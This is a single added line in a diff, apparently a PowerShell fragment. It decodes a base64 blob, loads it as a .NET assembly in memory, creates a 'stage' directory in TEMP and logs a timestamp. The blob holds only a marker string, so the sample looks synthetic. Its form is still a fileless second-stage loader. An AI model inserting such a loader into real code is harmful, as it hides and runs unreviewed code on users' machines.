@@ -1,0 +1,1 @@
+try { $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpyYTc5MGZueXMx'); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
